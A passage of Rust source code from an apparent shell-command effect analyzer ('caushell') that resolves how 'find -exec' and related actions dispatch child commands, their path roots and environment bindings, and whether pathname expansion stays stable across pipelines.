        .any(|value| matches!(value, BoundValue::ImplicitInput { .. }));
    let mut only_bounded_glob_roots = !root_values.is_empty();
    let mut roots = if root_values.is_empty() {
        vec![".".to_string()]
    } else {
        root_values
            .iter()
            .flat_map(|value| match value {
                BoundValue::Argument {
                    text,
                    quoted,
                    node_kind,
                    materialization,
                    ownership,
                    ..
                } => {
                    let runtime_data = matches!(
                        materialization,
                        caushell_profile::BoundArgumentMaterialization::RuntimeData
                            | caushell_profile::BoundArgumentMaterialization::ResolvedExactScalar { .. }
                            | caushell_profile::BoundArgumentMaterialization::ResolvedRuntimeProduced { .. }
                    );
                    let decoded_root = if runtime_data {
                        Some(text.clone())
                    } else {
                        caushell_parse::decode_static_shell_argument(text, *quoted, node_kind)
                    };
                    let Some(root) = decoded_root else {
                        // Preserve a set bound, not an invented glob member.
                        // Relative bounds belong to the eventual execution cwd,
                        // which may differ from the request's initial cwd.
                        if !runtime_data
                            && let Some(bounds) = crate::path::iteration_glob_bounds(
                                text,
                                *quoted,
                                node_kind,
                                ".",
                                home,
                                *ownership == caushell_profile::ArgumentOwnership::Operand,
                            )
                        {
                            match bounds {
                                caushell_types::PathResolution::BoundedPathSet {
                                    roots,
                                    may_escape,
                                } => {
                                    roots_unknown |= may_escape;
                                    return roots;
                                }
                                caushell_types::PathResolution::Concrete { path } => {
                                    only_bounded_glob_roots = false;
                                    return vec![path];
                                }
                                _ => {}
                            }
                        }
                        only_bounded_glob_roots = false;
                        roots_unknown = true;
                        return Vec::new();
                    };
                    only_bounded_glob_roots = false;
                    let Some(_) =
                        resolve_path_operand(&root, *quoted, node_kind, cwd, home)
                    else {
                        roots_unknown = true;
                        return Vec::new();
                    };
                    let tilde_expanded =
                        !runtime_data && !quoted && (root == "~" || root.starts_with("~/"));
                    if tilde_expanded {
                        match crate::path::expand_home_path_spelling(&root, home) {
                            Some(root) => vec![root],
                            None => {
                                roots_unknown = true;
                                Vec::new()
                            }
                        }
                    } else {
                        // Keep argv spelling, including absolute trailing '/'
                        // and dot components, until any suffix is applied.
                        vec![root]
                    }
                }
                BoundValue::ImplicitInput { .. } => {
                    only_bounded_glob_roots = false;
                    Vec::new()
                }
            })
            .collect()
    };
    // nullglob can remove every search operand. In that case find searches
    // '.' rather than the nominal glob scope. Keep it relative to execution cwd.
    if only_bounded_glob_roots && !roots.iter().any(|root| root == ".") {
        roots.push(".".into());
    }
    let follows_symlinks = resolved
        .bound
        .applied_modifiers
        .iter()
        .any(|modifier| modifier.as_str() == "follow_symlinks");
    let search_domain = caushell_types::RuntimeArgumentDomain::PathSet {
        may_escape: follows_symlinks || roots.is_empty() || roots_unknown,
        roots: roots.clone(),
        basename_suffix: None,
        no_adjacent_slashes: false,
        dot_relative_components: !follows_symlinks
            && !roots_unknown
            && roots.as_slice() == ["."]
            && root_values.len() == 1
            && !resolved.bound.operation_semantics_unresolved
            && resolved.bound.residuals.is_empty()
            && registry.lookup("find").profile.is_some_and(|profile| {
                profile.trust.source == caushell_profile::ProfileSourceKind::BuiltIn
            }),
        execdir_leaf: false,
    };
    // Only a validated, static global minimum depth excludes the starting
    // points. Do not interpret arbitrary find predicates as scope proofs.
    let start_points_excluded = resolved
        .bound
        .bound_parameters
        .iter()
        .filter(|p| p.name.as_str() == "minimum_depth")
        .flat_map(|p| &p.values)
        .last()
        .and_then(|value| match value {
            BoundValue::Argument {
                text,
                quoted,
                node_kind,
                materialization,
                ..
            } => {
                let value = if matches!(
                    materialization,
                    caushell_profile::BoundArgumentMaterialization::Literal
                ) {
                    caushell_parse::decode_static_shell_argument(text, *quoted, node_kind)
                } else {
                    Some(text.clone())
                };
                value?.parse::<u64>().ok()
            }
            _ => None,
        })
        .is_some_and(|depth| depth >= 1);
    let execdir_domain = caushell_types::RuntimeArgumentDomain::PathSet {
        // execdir argv contains local basenames prefixed with ./, not the
        // caller-relative full paths emitted by -exec. The root '/' remains
        // '/' and is covered by the child's root-directory cwd.
        roots: if !start_points_excluded
            && roots
                .iter()
                .any(|root| root.trim_end_matches('/').rsplit('/').next() == Some(".."))
        {
            vec![".".into(), "..".into()]
        } else {
            vec![".".into()]
        },
        may_escape: roots_unknown,
        basename_suffix: None,
        no_adjacent_slashes: false,
        dot_relative_components: false,
        execdir_leaf: search_domain.has_dot_relative_components(),
    };
    let mut candidates = Vec::new();
    let mut unresolved = Vec::new();

    // Use the same ownership result as Profile selection and binding. Do not
    // rediscover actions inside option operands or child argv.
    for region in &resolved.bound.argument_regions {
        let action = match region.id.as_str() {
            "exec" => Some(("exec_command", false)),
            "execdir" => Some(("execdir_command", true)),
            "ok" => Some(("ok_command", false)),
            "okdir" => Some(("okdir_command", true)),
            _ => None,
        };
        let Some((command_slot, execdir)) = action else {
            continue;
        };
        let command_index = region.command_index;
        let end = region.end_index;
        let command_token = &tokens[command_index];
        let command_value = decoded.get(command_index).and_then(|value| value.as_deref());
        let batch = decoded.get(end).and_then(|value| value.as_deref()) == Some("+");
        let basename_suffix =
            find_action_basename_suffix(resolved, &decoded, &root_values, region);
        // The same closed native expression proof also validates the root
        // operands. For -exec ... {} +, find appends each directory entry
        // with one separator and preserves the root's original spelling.
        let no_adjacent_slashes = batch
            && basename_suffix.is_some()
            && !roots_unknown
            && !roots.is_empty()
            && root_values.iter().all(|value| {
                matches!(value, BoundValue::Argument {
                    materialization: caushell_profile::BoundArgumentMaterialization::Literal,
                    text,
                    ..
                } if !text.starts_with('~'))
            })
            && roots
                .iter()
                .all(|root| !root.is_empty() && !root.ends_with('/') && !root.contains("//"));

        let make_argument = |slot: &str,
                             token: &caushell_profile::ProjectedArg,
                             value: Option<&str>,
                             force_placeholder: bool| {
            let is_placeholder = value == Some("{}");
            let dynamic_placeholder = force_placeholder
                || value.is_some_and(|value| value.contains("{}") && value != "{}");
            let unknown = value.is_none();
            // The literal diff anchor precedes any filename bytes. Batched
            // GNU find rejects another placeholder. Keep the one native
            // option field while staying agnostic about the operand bytes.
            let anchor = if batch && unknown && command_value == Some("diff") {
                caushell_profile::native_diff_anchor(token)
            } else {
                None
            };
            let domain = value.filter(|value| value.contains("{}")).map(|value| {
                let mut domain = if execdir {
                    &execdir_domain
                } else {
                    &search_domain
                }
                .substitute_into(value, "{}");
                if is_placeholder
                    && let caushell_types::RuntimeArgumentDomain::PathSet {
                        basename_suffix: domain_suffix,
                        no_adjacent_slashes: domain_has_plain_separators,
                        ..
                    } = &mut domain
                {
                    *domain_suffix = basename_suffix.clone();
                    *domain_has_plain_separators = no_adjacent_slashes;
                }
                domain
            });
            DispatchArgument {
                slot: caushell_profile::SlotName::new(slot),
                text: if dynamic_placeholder || is_placeholder {
                    String::new()
                } else if let Some(value) = value {
                    value.to_string()
                } else {
                    token.text.clone()
                },
                // Only find's actual placeholder denotes an enumerated path.
                // Other unresolved shell expansions retain their original
                // token so normal materialization can preserve the unknown.
                implicit_input_source: (dynamic_placeholder || is_placeholder)
                    .then_some(caushell_types::ImplicitInputSource::DispatchOutput)
                    .or_else(|| anchor.map(|_| TypedImplicitInputSource::StdinData)),
                runtime_argument_domain: domain.or_else(|| {
                    anchor.map(|flag| caushell_types::RuntimeArgumentDomain::TextTemplate {
                        prefix: format!("{flag}="),
                        suffix: String::new(),
                    })
                }),
                runtime_data: !unknown && !dynamic_placeholder && !is_placeholder,
                quoted: token.quoted,
                node_kind: if dynamic_placeholder || is_placeholder {
                    // ';' substitutes one argv item; '+' replaces the final
                    // placeholder with a variable-width batch. Preserve this
                    // fact when the child is itself a shell or a wrapper.
                    if batch {
                        "runtime_argument_list"
                    } else {
                        "runtime_scalar"
                    }
                    .into()
                } else {
                    token.node_kind.clone()
                },
                span: token.span.clone(),
                binding_source: ArgumentBindingSource::RemainingArg,
            }
        };

        let command = make_argument(command_slot, command_token, command_value, false);
        let operands = command_index + 1..end;
        let optional_fields = tokens[operands.clone()]
            .iter()
            .filter(|token| token.native_region_field.is_some())
            .count();
        // Alternatives share the same execution frame, but the graph does
        // not join writes or execution state across mutually exclusive argv.
        // Recover only for declared closed, non-mutating reader variants.
        // Retain the original partial child and an explicit gap otherwise.
        let expand_layouts = optional_fields != 0
            && 3usize.checked_pow(optional_fields as u32)
                .is_some_and(|count| count <= MAX_LAYOUTS_PER_REGION)
            && command.runtime_data
            && registry
                .lookup_in_domain(&command.text, true, &CommandLookupDomain::External)
                .profile
                .is_some_and(|profile| {
                    profile.native_argv_effect_envelope.is_some_and(|kind| {
                        !kind.queries_network()
                            && super::symbolic_native_inputs::effect_profile(profile, kind)
                    })
                });
        if optional_fields != 0 && !expand_layouts {
            unresolved.push(UnresolvedDispatchCommand {
                lookup_domain: CommandLookupDomain::External,
                dispatch_index: candidates.len() + unresolved.len(),
                command_slot: SlotName::new(command_slot),
            });
        }
        let mut layouts = vec![Vec::new()];
        for at in operands {
            let token = &tokens[at];
            if expand_layouts && let Some(field) = token.native_region_field {
                layouts = layouts
                    .into_iter()
                    .flat_map(|prefix| {
                        field.variants().into_iter().map(move |value| {
                            let mut argv = prefix.clone();
                            if let Some(value) = value {
                                argv.push(make_argument("exec_args", token, Some(&value), false));
                            }
                            argv
                        })
                    })
                    .collect();
            } else {
                let value = decoded[at].as_deref();
                let argument = make_argument(
                    "exec_args", token, value, value.is_some_and(|value| value.contains("{}")),
                );
                let (last, earlier) = layouts.split_last_mut().expect("at least one argv layout");
                for argv in earlier {
                    argv.push(argument.clone());
                }
                last.push(argument);
            }
        }

        let working_directory = if execdir {
            DispatchWorkingDirectory::ContainingDirectories {
                roots: roots.clone(),
                start_points_excluded,
                may_escape: follows_symlinks || roots.is_empty() || roots_unknown,
            }
        } else {
            DispatchWorkingDirectory::Inherit
        };
        for argv in layouts {
            candidates.push(DispatchCommandCandidate {
                lookup_domain: CommandLookupDomain::External,
                stdin_from_parent: false,
                stdin_from_tool: false,
                // Find's callback inherits stdout regardless of whether its
                // arguments resolve to one layout or several alternatives.
                stdout_to_parent: true,
                dispatch_index: candidates.len() + unresolved.len(),
                command: command.clone(),
                argv,
                environment: Vec::new(),
                clear_environment: false,
                unknown_environment: false,
                unknown_environment_from: Vec::new(),
                unknown_environment_names: Vec::new(),
                generated_environment: Vec::new(),
                unset_environment: Vec::new(),
                working_directory: working_directory.clone(),
            });
        }
    }

    (candidates, unresolved)
}

/// Prove a filename constraint for an action reached through a simple
/// positive conjunction. Never infer it from a flag in an OR/NOT branch, an
/// operand carrying flag-like bytes, or a partial outer argv.
fn find_action_basename_suffix(
    resolved: &caushell_profile::ResolvedInvocationArtifact,
    decoded: &[Option<String>],
    roots: &[&BoundValue],
    region: &caushell_profile::BoundArgumentRegion,
) -> Option<String> {
    let args = &resolved.materialized_projection.invocation.args;
    if region.id != "exec"
        || resolved.bound.operation_semantics_unresolved
        || resolved.bound.argument_regions.len() != 1
        || region.end_index.checked_add(1)? != args.len()
        || roots.len() > region.start_index
    {
        return None;
    }
    for ((root, arg), value) in roots.iter().zip(args).zip(decoded) {
        let value = value.as_deref()?;
        if !matches!(root, BoundValue::Argument { span, .. } if *span == arg.span)
            || value.is_empty()
            || value.starts_with('-')
            || matches!(value, "!" | "(" | ")" | ",")
        {
            return None;
        }
    }
    let mut suffix: Option<&str> = None;
    let mut predicates = decoded[roots.len()..region.start_index].chunks_exact(2);
    for pair in &mut predicates {
        let (Some(flag), Some(value)) = (pair[0].as_deref(), pair[1].as_deref()) else {
            return None;
        };
        match flag {
            "-name" => {
                // This glob subset has literal ASCII bytes and only unescaped
                // wildcards. No locale-sensitive ranges, case folding or
                // decoding of shell source occurs at this stage.
                if value.len() > 4096
                    || !value.bytes().all(|byte| {
                        byte.is_ascii_alphanumeric() || b"._-*?".contains(&byte)
                    })
                {
                    return None;
                }
                let candidate = value.rsplit(['*', '?']).next().filter(|s| !s.is_empty());
                if candidate.is_some_and(|s| suffix.is_none_or(|current| s.len() > current.len())) {
                    suffix = candidate;
                }
            }
            "-type" if value.len() == 1 && b"bcdflps".contains(&value.as_bytes()[0]) => {}
            _ => return None,
        }
    }
    if !predicates.remainder().is_empty() {
        return None;
    }
    suffix.map(str::to_owned)
}

fn decoded_projected_argv_value(
    token: &caushell_profile::ProjectedArg,
    resolution: &ValueMaterialization,
    home: Option<&str>,
) -> Option<String> {
    if token.runtime_data
        || matches!(
            resolution,
            ValueMaterialization::ResolvedExactScalar { .. }
                | ValueMaterialization::ResolvedRuntimeProduced { .. }
                | ValueMaterialization::ResolvedShellWord { .. }
        )
    {
        // The value is already the materialized argv byte string. Do not run
        // shell expansion/quoting logic over data which may itself contain '$'.
        return Some(token.text.clone());
    }

    if matches!(resolution, ValueMaterialization::Static) {
        let value = caushell_parse::decode_static_shell_argument(
            &token.text,
            token.quoted,
            &token.node_kind,
        )?;
        // Quote removal is not the whole shell-to-argv conversion. A leading
        // unquoted tilde is expanded by the parent shell BEFORE tool dispatch.
        // Check source spelling, not decoded data: '\~/x' and '~/x' must keep
        // their literal tilde, as must values supplied by variables/tools.
        // Unsupported named/directory-stack prefixes or unknown HOME remain
        // unresolved rather than being laundered into relative child paths.
        if !token.quoted && token.text.starts_with('~') {
            return crate::path::expand_home_path_spelling(&value, home);
        }
        return Some(value);
    }

    // Missing or runtime-dependent values must stay unresolved. In
    // particular, never fall back to the source spelling as known argv data.
    None
}

fn dispatch_child_bindings(
    base: &SessionBindings,
    environment: &[caushell_profile::DispatchArgument],
) -> SessionBindings {
    let mut bindings = base.clone();

    // An unknown tool-decoded overlay may replace any inherited or explicitly
    // known variable. Do not let one harmless known assignment mask it. This
    // runs after clear_environment, because clearing inheritance cannot remove
    // uncertainty in the explicitly supplied overlay itself.
    if environment
        .iter()
        .any(|assignment| assignment.implicit_input_source.is_some())
    {
        bindings.reset_child_environment(false);
        return bindings;
    }

    for assignment in environment {
        let Some((name, value)) = assignment.text.split_once('=') else {
            continue;
        };
        if !is_valid_shell_identifier(name) {
            continue;
        }

        if let Some(value) =
            materialize_environment_assignment_value(value, base, assignment.runtime_data)
        {
            bindings.set_child_environment_value(
                name,
                caushell_profile::SessionValue::exact_scalar(value),
            );
        } else {
            bindings.set_child_environment_value(
                name,
                caushell_profile::SessionValue::opaque_dynamic(
                    "unresolved dispatched environment assignment",
                ),
            );
        }
    }

    bindings
}

fn dispatch_child_session_bindings(
    base: &SessionBindings,
    candidate: &caushell_profile::DispatchCommandCandidate,
    command: &caushell_parse::CommandFact,
) -> SessionBindings {
    let mut bindings = base.clone();
    // A dispatched executable does not perform the caller's shell function
    // lookup. Function export into a new interpreter is a separate capability.
    bindings.replace_function_bindings(std::iter::empty());
    if candidate.unknown_environment
        || candidate.unknown_environment_from.iter().any(|source| {
            match base.environment_value(&source.name) {
                caushell_profile::EnvironmentValueRef::Absent => false,
                caushell_profile::EnvironmentValueRef::Present(
                    caushell_profile::SessionValue::ExactScalar(value),
                ) if source.empty_is_unset && value.is_empty() => false,
                _ => true,
            }
        })
    {
        bindings.reset_child_environment(false);
    }
    if candidate.clear_environment {
        bindings.reset_child_environment(true);
    }
    for unset in &candidate.unset_environment {
        if unset.implicit_input_source.is_some() {
            bindings.reset_child_environment(false);
            continue;
        }
        let name = if unset.runtime_data {
            Some(unset.text.clone())
        } else {
            caushell_parse::decode_static_shell_argument(
                &unset.text,
                unset.quoted,
                &unset.node_kind,
            )
        };
        match name {
            Some(name) => bindings.remove(&name),
            None => bindings.reset_child_environment(false),
        }
    }
    for name in &candidate.unknown_environment_names {
        bindings.set_child_environment_value(
            name,
            caushell_profile::SessionValue::opaque_dynamic("tool-generated environment value"),
        );
    }
    for (name, domain) in &candidate.generated_environment {
        bindings.set_child_environment_domain(name, domain.clone());
    }
    let bindings = dispatch_child_bindings(&bindings, &candidate.environment);
    let mut bindings = match shell_dispatch_positional_arguments(command) {
        Some(args) => shell_payload_session_bindings(&bindings, &args),
        None => bindings,
    };
    bindings.set_command_lookup_domain(candidate.lookup_domain.clone());
    bindings
}

fn shell_dispatch_positional_arguments(
    command: &caushell_parse::CommandFact,
) -> Option<Vec<caushell_profile::ProjectedArg>> {
    if !matches!(command.command_name.as_deref(), Some("sh" | "bash")) {
        return None;
    }
    let projection = caushell_profile::project_invocation(command, InvocationRuntimeContext::new());
    let Some(c_flag_index) = projection
        .args
        .iter()
        .position(|argument| argument.text == "-c")
    else {
        return None;
    };
    let script_index = c_flag_index.saturating_add(1);
    if script_index >= projection.args.len() {
        return None;
    }
    Some(projection.args[script_index + 1..].to_vec())
}

fn materialize_environment_assignment_value(
    value: &str,
    bindings: &SessionBindings,
    runtime_data: bool,
) -> Option<String> {
    // Arguments known to have come from another command are data, not fresh
    // shell source. In particular, `$`, `;`, and whitespace must stay literal.
    if runtime_data {
        return Some(value.to_string());
    }

    if let Some(variable_name) = exact_variable_reference(value) {
        return bindings
            .get(variable_name)
            .and_then(|binding| match binding.value {
                caushell_profile::SessionValue::ExactScalar(value)
                | caushell_profile::SessionValue::RuntimeProduced { value, .. } => {
                    Some(value.clone())
                }
                caushell_profile::SessionValue::OpaqueDynamic { .. }
                | caushell_profile::SessionValue::RuntimeInput { .. }
                | caushell_profile::SessionValue::Structured(_) => None,
            });
    }

    (!contains_shell_dynamic_syntax(value)).then(|| value.to_string())
}

fn exact_variable_reference(text: &str) -> Option<&str> {
    if let Some(name) = text
        .strip_prefix("${")
        .and_then(|rest| rest.strip_suffix('}'))
    {
        return is_valid_shell_identifier(name).then_some(name);
    }

    let name = text.strip_prefix('$')?;
    is_valid_shell_identifier(name).then_some(name)
}

fn is_valid_shell_identifier(value: &str) -> bool {
    let mut chars = value.chars();
    let Some(first) = chars.next() else {
        return false;
    };
    if !(first == '_' || first.is_ascii_alphabetic()) {
        return false;
    }

    chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
}

fn contains_shell_dynamic_syntax(value: &str) -> bool {
    value.contains('$') || value.contains('`')
}

fn collect_top_level_dispatch_command_resolve_records(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    dispatch_commands: &[TopLevelDispatchDerivedCommand],
) -> Vec<ResolvedCommandSeed> {
    dispatch_commands
        .iter()
        .map(|command| {
            ResolvedCommandSeed::new(
                dispatch_derived_invocation_node_id(
                    &request.session_id,
                    request.sequence_no,
                    command.source_command_index,
                    command.dispatch_index,
                ),
                ParsedCommandRef::new(command.dispatch_index, command.command.span.clone()),
                caushell_profile::resolve_invocation_in_lookup_domain_with_stdout_proofs(
                    registry,
                    &command.command,
                    InvocationRuntimeContext {
                        shell_kind: request.shell_kind,
                        stdin_payload_available: command.stdin_available,
                        interactive_session: false,
                    },
                    &command.bindings,
                    &command.lookup_domain,
                    &command.stdout_proofs,
                )
                .into_artifact(),
            )
        })
        .collect()
}

fn collect_top_level_function_command_resolve_records(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    function_commands: &[TopLevelFunctionDerivedCommand],
) -> Vec<ResolvedCommandSeed> {
    function_commands
        .iter()
        .map(|command| {
            ResolvedCommandSeed::new(
                function_derived_invocation_node_id(
                    &request.session_id,
                    request.sequence_no,
                    command.source_command_index,
                    command.derived_command_index,
                ),
                ParsedCommandRef::new(command.derived_command_index, command.command.span.clone()),
                resolve_invocation_artifact_with_bindings(
                    registry,
                    &command.command,
                    runtime_context_for_parsed_command(
                        &command.parsed_body,
                        command.derived_command_index,
                        &command.command,
                    ),
                    &command.bindings,
                ),
            )
        })
        .collect()
}

fn collect_derived_command_resolve_records(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    nested_payload_records: &[NestedPayloadRecord],
) -> Vec<ResolvedCommandSeed> {
    let mut records = Vec::new();

    for record in nested_payload_records {
        let NestedPayloadResolution::Parsed { parsed, .. } = &record.resolution else {
            continue;
        };

        for (derived_command_index, command) in parsed.commands.iter().enumerate() {
            let command_bindings = apply_runtime_variable_bindings_before_span(
                registry,
                request,
                record.bindings.clone(),
                parsed,
                command.span.start_byte,
                request.sequence_no,
            );
            records.push(ResolvedCommandSeed::new(
                derived_invocation_node_id(
                    &request.session_id,
                    request.sequence_no,
                    record.record_id.0,
                    derived_command_index,
                ),
                ParsedCommandRef::new(derived_command_index, command.span.clone()),
                resolve_invocation_artifact_with_bindings(
                    registry,
                    command,
                    runtime_context_for_parsed_command(parsed, derived_command_index, command),
                    &command_bindings,
                ),
            ));
        }
    }

    records
}

#[derive(Debug, Clone)]
struct StaticPayloadLookupScope {
    parsed_scope: caushell_parse::ParsedCommandArtifact,
    command_index: usize,
    bindings: SessionBindings,
    scope_base_bindings: SessionBindings,
    /// A dispatcher supplies its output, not its own original stdin. Preserve
    /// this distinction through transparent wrapper chains for data decoders.
    stdin_is_parent_output: bool,
}

#[derive(Debug, Clone)]
struct ExpandedFrontierEntry {
    source_node_id: caushell_graph::NodeId,
    command_ref: ParsedCommandRef,
    parsed_scope: caushell_parse::ParsedCommandArtifact,
    rendered_command_text: String,
    result: ResolveInvocationArtifactResult,
    shell_kind: caushell_types::ShellKind,
    root_command_index: usize,
    depth: u8,
    parent_execution_node_id: caushell_graph::NodeId,
    bindings: SessionBindings,
    static_payload_scope: StaticPayloadLookupScope,
    history_anchor_node_id: caushell_graph::NodeId,
    origin_kind: ExecutionUnitOriginKind,
    origin_index: usize,
    origin_locator: ExecutionUnitOriginLocator,
    inherited_scope: ExecutionUnitInheritedScope,
}

fn source_let_with_arithmetic<'a>(
    entry: &'a ExpandedFrontierEntry,
    request_source: &caushell_parse::ParsedCommandArtifact,
) -> Option<&'a caushell_parse::CommandFact> {
    let scope = &entry.parsed_scope;
    let source_frame = match entry.origin_kind {
        ExecutionUnitOriginKind::TopLevel => scope.raw_command == request_source.raw_command,
        ExecutionUnitOriginKind::FunctionExpansion => true,
        _ => false,
    };
    if !source_frame
        || scope.shell_kind != caushell_types::ShellKind::Bash
        || !matches!(
            entry.bindings.command_lookup_domain(),
            caushell_profile::CommandLookupDomain::Shell
        )
    {
        return None;
    }
    let command = scope.commands.get(entry.command_ref.command_index)?;
    (command.command_name.as_deref() == Some("let")
        && !command.command_name_runtime_data
        && command.prefix_assignments.is_empty()
        && command.text == entry.rendered_command_text
        && command.tokens.iter().all(|token| {
            // A syntax site represents one source operand, not arbitrary
            // split fields or pathname expansions in the final argv.
            let single_word = matches!(token.node_kind.as_str(), "raw_string" | "string")
                || (token.node_kind == "word"
                    && !token.text.contains(['$', '`', '*', '?', '[', ']', '{', '}', '~', '\\']));
            single_word
                && !token.runtime_data
                && token.implicit_input_source.is_none()
                && token.runtime_argument_domain.is_none()
                && scope.shell_evaluations.iter().any(|site| {
                    matches!(site.kind, caushell_parse::ShellEvaluationKind::ArithmeticBuiltin)
                        && site.input.span == token.span
                })
        }))
    .then_some(command)
}

#[derive(Clone)]
struct ProgramSourceContext {
    entry_cwd: caushell_runner::EffectiveCwd,
    source_scopes: Vec<PayloadSourceScope>,
}

impl Default for ProgramSourceContext {
    fn default() -> Self {
        Self {
            entry_cwd: caushell_runner::EffectiveCwd::Unknown,
            source_scopes: Vec::new(),
        }
    }
}

fn program_scope_bindings(entry: &ExpandedFrontierEntry) -> &SessionBindings {
    if entry.parsed_scope == entry.static_payload_scope.parsed_scope {
        &entry.static_payload_scope.scope_base_bindings
    } else {
        &entry.bindings
    }
}

fn pathname_scope_is_stable(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    parsed: &caushell_parse::ParsedCommandArtifact,
    index: usize,
    bindings: &SessionBindings,
    proven_producer: Option<&caushell_parse::CommandSubstitutionFact>,
) -> Result<bool, String> {
    let observations = source_scope_observations(
        registry,
        request,
        parsed,
        parsed.commands.len().saturating_sub(1),
        bindings,
    );
    if observations.len() != parsed.commands.len() {
        return Err("pathname source scope exceeds its analysis budget".into());
    }
    if !parsed.redirections.is_empty()
        || !caushell_parse::parse_command_substitutions(&parsed.raw_command, parsed.shell_kind)
            .is_ok_and(|s| match s.as_slice() {
                [] => true,
                [one] => proven_producer == Some(one),
                _ => false,
            })
        || !caushell_parse::parse_process_substitutions(&parsed.raw_command, parsed.shell_kind)
            .is_ok_and(|s| s.is_empty())
    {
        return Err("pathname source scope contains unproved I/O or substitutions".into());
    }
    let relevant = |name: &str| {
        matches!(
            name,
            "GLOBIGNORE" | "LC_ALL" | "LC_COLLATE" | "LC_CTYPE" | "LANG" | "BASHOPTS" | "SHELLOPTS"
        )
    };
    if parsed
        .assignment_commands
        .iter()
        .flat_map(|c| &c.assignments)
        .chain(
            parsed
                .declaration_commands
                .iter()
                .flat_map(|c| &c.assignments),
        )
        .any(|a| relevant(&a.name))
        || parsed
            .unset_commands
            .iter()
            .flat_map(|c| &c.names)
            .any(|n| relevant(n))
    {
        return Err("pathname shell variables change within this action".into());
    }
    let mut writes_after_expansion = false;
    for (i, (result, observed_bindings)) in observations.iter().enumerate() {
        if i == index {
            continue;
        }
        let ResolveInvocationArtifactResult::Resolved(r) = result else {
            return Err("pathname source scope has unproved command effects".into());
        };
        let stdin_before_output = index == 0
            && i == 1
            && pathname_pipeline_consumer_writes_after_input(registry, parsed, observed_bindings, r);
        let deferred_write = |effect: &caushell_profile::Effect| {
            stdin_before_output
                && effect.kind == EffectKind::WritePath
                && matches!(&effect.target, EffectTarget::DerivedPath(target)
                    if target.rule == caushell_types::DerivedPathRule::FileNamePrefix)
        };
        if r.bound
            .effects
            .iter()
            .any(|e| e.kind == EffectKind::SetCurrentWorkingDirectory)
            && r.bound.bound_parameters.iter().any(|p| {
                p.values.iter().any(|v| {
                    matches!(v,
                BoundValue::Argument { text, .. } if !text.starts_with('/'))
                })
            })
        {
            return Err("pathname source cwd update is not independently anchored".into());
        }
        if r.bound.operation_semantics_unresolved
            || !r.bound.residuals.is_empty()
            || r.bound.effects.iter().any(|e| {
                !matches!(
                    e.kind,
                    EffectKind::ReadPath
                        | EffectKind::TargetPath
                        | EffectKind::ConsumeStdin
                        | EffectKind::TransformData
                        | EffectKind::ConsumeAuxiliaryValue
                        | EffectKind::ConsumeAuxiliaryEnvironment
                        | EffectKind::NetworkEndpoint
                        | EffectKind::SetCurrentWorkingDirectory
                        | EffectKind::SetExecutionWorkingDirectory
                ) && !deferred_write(e)
            })
        {
            return Err("pathname source effects may change names or shell options".into());
        }
        writes_after_expansion |= r.bound.effects.iter().any(deferred_write);
    }
    Ok(writes_after_expansion)
}

// With a direct stdout pipe, bytes from the producer's native invocation
// cannot reach the consumer before the shell expands the producer's argv.
fn pathname_pipeline_consumer_writes_after_input(
    registry: &ProfileRegistry,
    parsed: &caushell_parse::ParsedCommandArtifact,
    bindings: &SessionBindings,
    consumer: &caushell_profile::ResolvedInvocationArtifact,
) -> bool {
    let [producer, command] = parsed.commands.as_slice() else {
        return false;
    };
    let Some(name) = command.command_name.as_deref() else {
        return false;
    };
    if parsed.shell_kind != caushell_types::ShellKind::Bash
        || parsed.status != caushell_parse::ParseStatus::Complete
        || producer.pipeline_span.is_none()
        || producer.pipeline_span != command.pipeline_span
        || parsed
            .raw_command
            .get(producer.span.end_byte..command.span.start_byte)
            .is_none_or(|text| text.trim() != "|")
        || [producer, command].iter().any(|cmd| {
            cmd.guarded
                || cmd.conditional_execution
                || cmd.control_flow_span.is_some()
                || cmd.terminator.is_some()
                || !cmd.prefix_assignments.is_empty()
        })
        || name != consumer.normalized_command_name
        || bindings.profile_has_alias_shadow(name)
        || bindings.function_binding(name).is_some()
    {
        return false;
    }
    let Some(profile) = registry.lookup(name).profile else {
        return false;
    };
    if profile.trust.source != caushell_profile::ProfileSourceKind::BuiltIn
        || !profile.argument_files.is_empty()
        || !profile.environment_inputs.is_empty()
        || profile.option_environment.is_some()
        || !profile.implicit_config_files.is_empty()
        || profile.configuration_files.is_some()
        || profile.native_configuration.is_some()
    {
        return false;
    }
    let bound = &consumer.bound;
    let Some(flags) = profile.forms.iter().find(|form| form.id == bound.form_id)
        .and_then(|form| form.extensions.get("caushell.form/stdin_before_output_flags"))
        .and_then(JsonValue::as_array) else {
        return false;
    };
    consumer.proven_stream_contract().is_some()
        && consumer.materialized_projection.invocation.args.iter().all(|arg| {
            caushell_profile::argument_structure(arg).exact_value().is_some()
        })
        && bound.owned_option_flags.iter().all(|source| {
            matches!(source, ArgumentBindingSource::FollowingFlag { flag_name, .. }
                if flags.iter().any(|entry| entry.as_str() == Some(flag_name.as_str())))
        })
        && bound.effects.iter().any(|effect| {
            let (EffectKind::ConsumeStdin, EffectTarget::Slot(slot)) = (&effect.kind, &effect.target) else {
                return false;
            };
            bound.bound_parameters.iter().any(|parameter| {
                &parameter.name == slot
                    && matches!(&parameter.values[..], [BoundValue::Argument { text, .. }] if text == "-")
            })
        })
}

fn read_only_process_substitution_parent(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    scope: &PayloadSourceScope,
    current: &caushell_parse::ParsedCommandArtifact,
    current_index: usize,
) -> bool {
    let outer = &scope.parsed;
    let [parent] = outer.commands.as_slice() else {
        return false;
    };
    if scope.before_command_index != 0 || outer.shell_kind != caushell_types::ShellKind::Bash {
        return false;
    }
    let Ok(substitutions) =
        caushell_parse::parse_process_substitutions(&outer.raw_command, outer.shell_kind)
    else {
        return false;
    };
    if substitutions.len() > 8
        || substitutions
            .iter()
            .filter(|sub| sub.body_text == current.raw_command)
            .count()
            != 1
        || !substitutions.iter().all(|sub| {
            sub.operator == caushell_parse::ProcessSubstitutionOperator::Input
                && parent.tokens.iter().any(|token| {
                    token.span == sub.span
                        && token.node_kind == "process_substitution"
                        && !token.runtime_data
                })
        })
    {
        return false;
    }
    let simple = |parsed: &caushell_parse::ParsedCommandArtifact| {
        parsed.status == caushell_parse::ParseStatus::Complete
            && parsed.redirections.is_empty()
            && parsed.shell_evaluations.is_empty()
            && parsed.status_conditions.is_empty()
            && parsed.assignment_commands.is_empty()
            && parsed.declaration_commands.is_empty()
            && parsed.function_definitions.is_empty()
            && parsed.for_loops.is_empty()
